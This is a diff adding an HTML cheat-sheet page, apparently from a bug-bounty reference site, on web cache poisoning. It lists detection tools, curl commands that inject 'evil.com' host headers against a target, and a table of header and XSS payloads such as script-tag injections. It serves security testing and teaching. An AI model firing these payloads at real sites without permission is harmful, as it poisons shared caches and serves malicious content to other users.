@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cache Poisoning - Bug Bounty Hub</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="index.html" class="nav-logo">
+                <img src="logo/logo.png" alt="BugBounty Hub">
+            </a>
+            <button class="nav-toggle" id="navToggle">
+                <i class="fas fa-bars"></i>
+            </button>
+            <ul class="nav-menu" id="navMenu">
+                <li><a href="index.html" class="nav-link">Home</a></li>
+                <li class="dropdown">
+                    <a href="#" class="nav-link">Vulnerabilities <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="manual-open-redirect.html"><i class="fas fa-external-link-alt"></i> Manual Open Redirect</a></li>
+                        <li><a href="open-redirect.html"><i class="fas fa-robot"></i> Automated Open Redirect</a></li>
+                        <li><a href="xss.html"><i class="fas fa-bug"></i> XSS</a></li>
+                        <li><a href="blind-xss.html"><i class="fas fa-eye-slash"></i> Blind XSS</a></li>
+                        <li><a href="sqli.html"><i class="fas fa-database"></i> SQL Injection</a></li>
+                        <li><a href="idor.html"><i class="fas fa-id-card"></i> IDOR</a></li>
+                        <li><a href="lfi.html"><i class="fas fa-folder-open"></i> LFI</a></li>
+                        <li><a href="cmdi.html"><i class="fas fa-terminal"></i> Command Injection</a></li>
+                        <li><a href="subdomain-takeover.html"><i class="fas fa-globe"></i> Subdomain Takeover</a></li>
+                        <li><a href="cors.html"><i class="fas fa-exchange-alt"></i> CORS</a></li>
+                        <li><a href="csp-guide.html"><i class="fas fa-shield-alt"></i> CSP Guide</a></li>
+                        <li><a href="xxe.html"><i class="fas fa-file-code"></i> XXE</a></li>
+                        <li><a href="ssti.html"><i class="fas fa-file-alt"></i> SSTI</a></li>
+                        <li><a href="crlf.html"><i class="fas fa-code"></i> CRLF Injection</a></li>
+                        <li><a href="ssrf-payloads.html"><i class="fas fa-server"></i> SSRF Payloads</a></li>
+                        <li><a href="race-conditions.html"><i class="fas fa-stopwatch"></i> Race Conditions</a></li>
+                        <li><a href="poisoning.html"><i class="fas fa-bolt"></i> Cache Poisoning</a></li>
+                        <li><a href="information-disclosure.html"><i class="fas fa-eye"></i> Info Disclosure</a></li>
+                        <li><a href="host-header-injection.html"><i class="fas fa-globe-americas"></i> Host Header</a></li>
+                        <li><a href="header-injection.html"><i class="fas fa-heading"></i> Header Injection</a></li>
+                        <li><a href="html-injection.html"><i class="fas fa-code"></i> HTML Injection</a></li>
+                        <li><a href="directory-traversal.html"><i class="fas fa-folder"></i> Directory Traversal</a></li>
+                        <li><a href="wordpress.html"><i class="fab fa-wordpress"></i> WordPress</a></li>
+                        <li><a href="spring-boot.html"><i class="fas fa-leaf"></i> Spring Boot</a></li>
+                    </ul>
+                </li>
+                <li class="dropdown">
+                    <a href="#" class="nav-link">Tools <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="useful-tools.html"><i class="fas fa-toolbox"></i> Recon Tools</a></li>
+                        <li><a href="nuclei.html"><i class="fas fa-rocket"></i> Nuclei</a></li>
+                    </ul>
+                </li>
+                <li><a href="about.html" class="nav-link">About</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <header class="page-header">
+        <div class="breadcrumb">
+            <a href="index.html">Home</a>
+            <i class="fas fa-chevron-right"></i>
+            <span>Cache Poisoning</span>
+        </div>
+        <h1><i class="fas fa-bolt"></i> Web Cache Poisoning</h1>
+        <p>Web cache poisoning techniques and testing methodology.</p>
+    </header>
+
+    <section class="content-section">
+        <div class="container">
+            <div class="content-card">
+                <h2><i class="fas fa-info-circle"></i> What is Web Cache Poisoning?</h2>
+                <p>Web cache poisoning is an advanced technique whereby an attacker causes the web server to cache harmful content that is later served to other users. This can lead to:</p>
+                <ul>
+                    <li>XSS via cache</li>
+                    <li>Session hijacking</li>
+                    <li>Data theft</li>
+                    <li>Defacement</li>
+                </ul>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-tools"></i> Cache Poisoning Tools</h2>
+                <h3>Param Miner (Burp Suite)</h3>
+                <p>Identifies hidden, unlinked parameters useful for cache poisoning.</p>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre># Install from BApp Store in Burp Suite
+# Right-click request → Extensions → Param Miner → Guess params</pre>
+                </div>
+
+                <h3>Web Cache Vulnerability Scanner</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>python3 web_cache_vulnerability_scanner.py -u https://target.com</pre>
+                </div>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-terminal"></i> Manual Testing</h2>
+                <h3>1. Identify Cache Behavior</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>curl -I https://target.com | grep -i cache</pre>
+                </div>
+                <p>Look for headers like:</p>
+                <ul>
+                    <li><code>X-Cache</code></li>
+                    <li><code>X-Cache-Hits</code></li>
+                    <li><code>CF-Cache-Status</code> (Cloudflare)</li>
+                    <li><code>X-Served-By</code></li>
+                </ul>
+
+                <h3>2. Test Cache Key Poisoning</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre># First request - poison the cache
+curl "https://target.com/page?param=value" -H "X-Forwarded-Host: evil.com"
+
+# Second request - check if poisoned
+curl "https://target.com/page"</pre>
+                </div>
+
+                <h3>3. Host Header Poisoning</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>curl -I https://target.com -H "Host: evil.com"
+curl -I https://target.com -H "X-Forwarded-Host: evil.com"
+curl -I https://target.com -H "X-Original-URL: /admin"</pre>
+                </div>
+
+                <h3>4. Query Parameter Poisoning</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre># Find unkeyed parameters
+curl "https://target.com/page?cb=1&utm_source=evil"
+curl "https://target.com/page?cb=2&utm_source=evil"</pre>
+                </div>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-bolt"></i> Common Cache Poisoning Payloads</h2>
+                <table>
+                    <tr>
+                        <th>Technique</th>
+                        <th>Payload</th>
+                    </tr>
+                    <tr>
+                        <td>Host Header</td>
+                        <td><code>X-Forwarded-Host: evil.com</code></td>
+                    </tr>
+                    <tr>
+                        <td>Port Injection</td>
+                        <td><code>Host: target.com:evil.com</code></td>
+                    </tr>
+                    <tr>
+                        <td>Query String</td>
+                        <td><code>?utm_source=<script>alert(1)</script></code></td>
+                    </tr>
+                    <tr>
+                        <td>Path Normalization</td>
+                        <td><code>/page/../admin</code></td>
+                    </tr>
+                    <tr>
+                        <td>Method Override</td>
+                        <td><code>X-HTTP-Method-Override: POST</code></td>
+                    </tr>
+                    <tr>
+                        <td>Accept Header</td>
+                        <td><code>Accept: text/html,<script>alert(1)</script></code></td>
+                    </tr>
+                </table>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-exclamation-triangle"></i> Impact Escalation</h2>
+                <ul>
+                    <li><strong>Stored XSS:</strong> Cache malicious JS to serve all users</li>
+                    <li><strong>Data Extraction:</strong> Cache pages with sensitive data</li>
+                    <li><strong>Defacement:</strong> Cache modified page content</li>
+                    <li><strong>DoS:</strong> Cache error pages or redirects</li>
+                </ul>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2026 Bug Bounty Hub. Open source security reference.</p>
+            <p>Made with <i class="fas fa-heart"></i> for the security community</p>
+        </div>
+    </footer>
+
+    <div id="toast" class="toast">Copied to clipboard!</div>
+    <script src="script.js"></script>
+</body>
+</html>
